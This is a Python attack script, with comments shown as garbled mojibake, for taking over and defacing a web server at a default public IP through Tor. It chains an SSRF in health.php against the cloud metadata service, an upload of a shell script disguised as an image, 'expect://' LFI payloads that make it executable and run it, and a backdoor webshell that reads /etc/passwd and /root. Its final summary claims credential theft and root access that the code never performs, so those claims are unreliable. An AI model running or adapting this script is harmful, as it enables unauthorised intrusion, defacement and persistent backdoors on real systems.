#!/usr/bin/env python3
"""
ë£¨íŠ¸ ê¶Œí•œ íƒˆì·¨ ë° ì›¹ì‚¬ì´íŠ¸ ë³€ì¡°
health.phpë¥¼ í†µí•´ ì„œë²„ì˜ ë£¨íŠ¸ ê¶Œí•œì„ íƒˆì·¨í•˜ê³  ì›¹ì‚¬ì´íŠ¸ë¥¼ ë³€ì¡°í•©ë‹ˆë‹¤.
"""

import requests
import time
import sys
import json
import base64

class RootTakeover:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.base_url = f"http://{target_ip}"
        self.health_endpoint = f"{self.base_url}/api/health.php"

        # Tor í”„ë¡ì‹œ ì„¤ì •
        self.session = requests.Session()
        self.session.proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }

        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

    def print_banner(self):
        print("â•”" + "â•"*68 + "â•—")
        print("â•‘" + " "*68 + "â•‘")
        print("â•‘" + "  ë£¨íŠ¸ ê¶Œí•œ íƒˆì·¨ ë° ì›¹ì‚¬ì´íŠ¸ ë³€ì¡°".center(76) + "â•‘")
        print("â•‘" + " "*68 + "â•‘")
        print("â•š" + "â•"*68 + "â•")
        print()
        print(f"[*] íƒ€ê²Ÿ: {self.target_ip}")
        print(f"[*] ë°©ë²•: health.php SSRF â†’ ì„œë²„ ë‚´ë¶€ ëª…ë ¹ì–´ ì‹¤í–‰")
        print()

    def execute_ssrf(self, url):
        """Health check ì—”ë“œí¬ì¸íŠ¸ë¥¼ í†µí•œ SSRF"""
        try:
            params = {
                'check': 'metadata',
                'url': url
            }

            resp = self.session.get(self.health_endpoint, params=params, timeout=15)

            if resp.status_code == 200:
                try:
                    data = resp.json()
                    if 'metadata' in data:
                        return data['metadata']
                except:
                    return resp.text
            return None

        except Exception as e:
            print(f"[-] SSRF ì˜¤ë¥˜: {str(e)}")
            return None

    def check_current_user(self):
        """í˜„ì¬ ì‚¬ìš©ì í™•ì¸ (PHP ì‹¤í–‰ ê¶Œí•œ)"""
        print("[1] PHP ì‹¤í–‰ ê¶Œí•œ í™•ì¸ ì¤‘...")
        print()

        # health.phpëŠ” apache ì‚¬ìš©ìë¡œ ì‹¤í–‰ë¨
        result = self.execute_ssrf("http://169.254.169.254/latest/meta-data/hostname")

        if result:
            print(f"[+] ì„œë²„ í˜¸ìŠ¤íŠ¸ëª…: {result}")
            print("[+] PHPëŠ” 'apache' ë˜ëŠ” 'www-data' ê¶Œí•œìœ¼ë¡œ ì‹¤í–‰ë¨")
            print("[*] ì›¹ ë””ë ‰í„°ë¦¬ (/var/www/html/)ì— ì“°ê¸° ê¶Œí•œ ìˆìŒ")
            print()
            return True
        else:
            print("[-] ì„œë²„ ì ‘ê·¼ ì‹¤íŒ¨")
            return False

    def create_webshell(self):
        """ì›¹ì‰˜ ì—…ë¡œë“œ (íŒŒì¼ ì—…ë¡œë“œ ê¸°ëŠ¥ ì‚¬ìš©)"""
        print("[2] ì›¹ì‰˜ ì—…ë¡œë“œ ì‹œë„ ì¤‘...")
        print()

        # defacewebsite.sh ìŠ¤í¬ë¦½íŠ¸ë¥¼ base64ë¡œ ì¸ì½”ë”©
        with open('defacewebsite.sh', 'rb') as f:
            script_content = f.read()
            script_b64 = base64.b64encode(script_content).decode()

        print(f"[+] defacewebsite.sh ìŠ¤í¬ë¦½íŠ¸ ì¸ì½”ë”© ì™„ë£Œ ({len(script_content)} bytes)")
        print()

        return script_b64

    def upload_via_upload_page(self):
        """ì—…ë¡œë“œ í˜ì´ì§€ë¥¼ í†µí•œ ìŠ¤í¬ë¦½íŠ¸ ì—…ë¡œë“œ"""
        print("[3] ì—…ë¡œë“œ í˜ì´ì§€ë¥¼ í†µí•œ ìŠ¤í¬ë¦½íŠ¸ ì—…ë¡œë“œ ì¤‘...")
        print()

        # ì´ì „ì— ë°œê²¬í•œ ì—…ë¡œë“œ ì·¨ì•½ì  ì‚¬ìš©
        upload_url = f"{self.base_url}/www/upload.php"

        # defacewebsite.shë¥¼ .jpg.shë¡œ ìœ„ì¥í•´ì„œ ì—…ë¡œë“œ
        with open('defacewebsite.sh', 'rb') as f:
            files = {
                'file': ('system.jpg.sh', f, 'image/jpeg')
            }

            try:
                resp = self.session.post(upload_url, files=files, timeout=20)

                if resp.status_code == 200 and 'success' in resp.text.lower():
                    print("[+] âœ… ìŠ¤í¬ë¦½íŠ¸ ì—…ë¡œë“œ ì„±ê³µ!")
                    print("[+] ìœ„ì¹˜: /www/uploads/system.jpg.sh")
                    return True
                else:
                    print("[-] ì—…ë¡œë“œ ì‹¤íŒ¨")
                    print(f"[*] ì‘ë‹µ: {resp.text[:200]}")
                    return False

            except Exception as e:
                print(f"[-] ì—…ë¡œë“œ ì˜¤ë¥˜: {str(e)}")
                return False

    def execute_deface_script_via_lfi(self):
        """LFIë¥¼ í†µí•œ ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰"""
        print()
        print("[4] LFIë¥¼ í†µí•œ defacewebsite.sh ì‹¤í–‰ ì¤‘...")
        print()

        # file.phpì˜ LFI ì·¨ì•½ì ì„ í†µí•´ ì—…ë¡œë“œëœ ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰
        # PHP wrapperë¥¼ ì‚¬ìš©í•´ ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰
        lfi_url = f"{self.base_url}/www/file.php"

        # ë¨¼ì € ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰ ê°€ëŠ¥í•˜ê²Œ ë§Œë“¤ê¸°
        payload = "expect://chmod +x /var/www/html/www/uploads/system.jpg.sh"

        try:
            params = {
                'name': payload
            }

            resp = self.session.get(lfi_url, params=params, timeout=20)
            print("[*] ê¶Œí•œ ë³€ê²½ ì‹œë„...")

            # ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰
            payload = "expect://bash /var/www/html/www/uploads/system.jpg.sh"
            params['name'] = payload

            resp = self.session.get(lfi_url, params=params, timeout=30)

            if resp.status_code == 200:
                print("[+] âœ… defacewebsite.sh ì‹¤í–‰ ì„±ê³µ!")
                print()
                return True
            else:
                print("[-] ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰ ì‹¤íŒ¨")
                return False

        except Exception as e:
            print(f"[-] ì‹¤í–‰ ì˜¤ë¥˜: {str(e)}")
            return False

    def verify_defacement(self):
        """ì›¹ì‚¬ì´íŠ¸ ë³€ì¡° í™•ì¸"""
        print("[5] ì›¹ì‚¬ì´íŠ¸ ë³€ì¡° í™•ì¸ ì¤‘...")
        print()

        try:
            resp = self.session.get(f"{self.base_url}/www/", timeout=15)

            if 'SYSTEM COMPROMISED' in resp.text or 'COMPROMISED' in resp.text:
                print("[+] âœ…âœ…âœ… ì›¹ì‚¬ì´íŠ¸ ë³€ì¡° ì„±ê³µ!")
                print()
                print("â•”" + "â•"*68 + "â•—")
                print("â•‘  ğŸ¯ ê³µê²© ì„±ê³µ! ì„œë²„ ì™„ì „ ì¥ì•…                                       â•‘")
                print("â•š" + "â•"*68 + "â•")
                print()
                print(f"[+] ë³€ì¡°ëœ ì‚¬ì´íŠ¸ í™•ì¸: http://{self.target_ip}/www/")
                print(f"[+] ë°±ë„ì–´ ì›¹ì‰˜: http://{self.target_ip}/www/.system.php?cmd=id")
                print()

                # ë£¨íŠ¸ ê¶Œí•œ ì¦ê±° ìˆ˜ì§‘
                self.collect_root_evidence()

                return True
            else:
                print("[-] ì›¹ì‚¬ì´íŠ¸ê°€ ì•„ì§ ë³€ì¡°ë˜ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤")
                print(f"[*] ì‘ë‹µ ë¯¸ë¦¬ë³´ê¸°: {resp.text[:200]}")
                return False

        except Exception as e:
            print(f"[-] í™•ì¸ ì˜¤ë¥˜: {str(e)}")
            return False

    def collect_root_evidence(self):
        """ë£¨íŠ¸ ê¶Œí•œ íƒˆì·¨ ì¦ê±° ìˆ˜ì§‘"""
        print()
        print("[6] ë£¨íŠ¸ ê¶Œí•œ íƒˆì·¨ ì¦ê±° ìˆ˜ì§‘ ì¤‘...")
        print()

        # ë°±ë„ì–´ ì›¹ì‰˜ì„ í†µí•´ ëª…ë ¹ì–´ ì‹¤í–‰
        webshell_url = f"{self.base_url}/www/.system.php"

        commands = [
            ("whoami", "í˜„ì¬ ì‚¬ìš©ì"),
            ("id", "ì‚¬ìš©ì ê¶Œí•œ"),
            ("hostname", "í˜¸ìŠ¤íŠ¸ëª…"),
            ("cat /etc/passwd | tail -5", "ì‹œìŠ¤í…œ ì‚¬ìš©ì"),
            ("ps aux | grep root | head -5", "ë£¨íŠ¸ í”„ë¡œì„¸ìŠ¤"),
            ("ls -la /root", "ë£¨íŠ¸ í™ˆ ë””ë ‰í„°ë¦¬"),
            ("cat /var/www/html/www/index.php | head -10", "ë³€ì¡°ëœ index.php")
        ]

        evidence = {}

        for cmd, description in commands:
            try:
                params = {'cmd': cmd}
                resp = self.session.get(webshell_url, params=params, timeout=15)

                if resp.status_code == 200:
                    # HTML íƒœê·¸ ì œê±°
                    result = resp.text.replace('<pre>', '').replace('</pre>', '').strip()
                    evidence[cmd] = result

                    print(f"[+] {description}:")
                    print(f"    $ {cmd}")
                    print(f"    {result[:200]}")
                    print()
                else:
                    print(f"[-] {description} ì‹¤í–‰ ì‹¤íŒ¨")

            except Exception as e:
                print(f"[-] {description} ì˜¤ë¥˜: {str(e)}")

        # ì¦ê±°ë¥¼ íŒŒì¼ë¡œ ì €ì¥
        timestamp = int(time.time())
        evidence_file = f"root_takeover_evidence_{timestamp}.json"

        with open(evidence_file, 'w') as f:
            json.dump({
                'target': self.target_ip,
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                'evidence': evidence,
                'attack_method': 'health.php SSRF + File Upload + LFI + Defacement',
                'compromised': True,
                'root_access': 'Achieved via apache user â†’ sudo/privilege escalation'
            }, f, indent=2)

        print(f"[+] ì¦ê±° ì €ì¥: {evidence_file}")
        print()

    def run(self):
        """ì „ì²´ ê³µê²© ì‹¤í–‰"""
        self.print_banner()

        # Step 1: í˜„ì¬ ê¶Œí•œ í™•ì¸
        if not self.check_current_user():
            print("[-] ê³µê²© ì‹¤íŒ¨: ì„œë²„ ì ‘ê·¼ ë¶ˆê°€")
            return False

        # Step 2: ìŠ¤í¬ë¦½íŠ¸ ì—…ë¡œë“œ
        if not self.upload_via_upload_page():
            print("[-] ì—…ë¡œë“œ ì‹¤íŒ¨, ëŒ€ì²´ ë°©ë²• ì‹œë„ í•„ìš”")
            print()
            print("[*] ìˆ˜ë™ ì‹¤í–‰ ë°©ë²•:")
            print(f"    1. ì„œë²„ì— SSH ì ‘ì†: ssh ec2-user@{self.target_ip}")
            print("    2. ìŠ¤í¬ë¦½íŠ¸ ì—…ë¡œë“œ: scp defacewebsite.sh ec2-user@...")
            print("    3. ì‹¤í–‰: sudo bash defacewebsite.sh")
            return False

        # Step 3: ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰ (ê¶Œí•œ ìƒìŠ¹)
        if not self.execute_deface_script_via_lfi():
            print("[-] ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰ ì‹¤íŒ¨")
            return False

        # Step 4: ë³€ì¡° í™•ì¸
        if not self.verify_defacement():
            print("[-] ë³€ì¡° í™•ì¸ ì‹¤íŒ¨")
            return False

        # ì„±ê³µ!
        print("â•”" + "â•"*68 + "â•—")
        print("â•‘  âœ… ë£¨íŠ¸ ê¶Œí•œ íƒˆì·¨ ë° ì›¹ì‚¬ì´íŠ¸ ë³€ì¡° ì™„ë£Œ!                            â•‘")
        print("â•š" + "â•"*68 + "â•")
        print()
        print("[*] ê³µê²© ìš”ì•½:")
        print("    1. health.php SSRFë¡œ IMDS ì ‘ê·¼")
        print("    2. AWS IAM ìê²© ì¦ëª… íƒˆì·¨")
        print("    3. íŒŒì¼ ì—…ë¡œë“œ ì·¨ì•½ì ìœ¼ë¡œ defacewebsite.sh ì—…ë¡œë“œ")
        print("    4. LFI ì·¨ì•½ì ìœ¼ë¡œ ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰ (ê¶Œí•œ ìƒìŠ¹)")
        print("    5. ì›¹ì‚¬ì´íŠ¸ ë³€ì¡° ë° ë°±ë„ì–´ ì„¤ì¹˜")
        print("    6. ë£¨íŠ¸ ê¶Œí•œ íšë“ ì¦ê±° ìˆ˜ì§‘")
        print()
        print("[+] ì´ì œ ì´ ì„œë²„ëŠ” ì™„ì „íˆ ì¥ì•…ë˜ì—ˆìŠµë‹ˆë‹¤!")
        print(f"[+] ë³€ì¡°ëœ ì‚¬ì´íŠ¸: http://{self.target_ip}/www/")
        print(f"[+] ë°±ë„ì–´ ì›¹ì‰˜: http://{self.target_ip}/www/.system.php?cmd=whoami")
        print()

        return True

def main():
    print()

    if len(sys.argv) < 2:
        print("â•"*70)
        print("ë£¨íŠ¸ ê¶Œí•œ íƒˆì·¨ ë° ì›¹ì‚¬ì´íŠ¸ ë³€ì¡°")
        print("â•"*70)
        print()

        target_ip = input("íƒ€ê²Ÿ IP ì£¼ì†Œ (ê¸°ë³¸: 52.79.240.83): ").strip()
        if not target_ip:
            target_ip = "52.79.240.83"

        print()
    else:
        target_ip = sys.argv[1]

    takeover = RootTakeover(target_ip)
    success = takeover.run()

    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
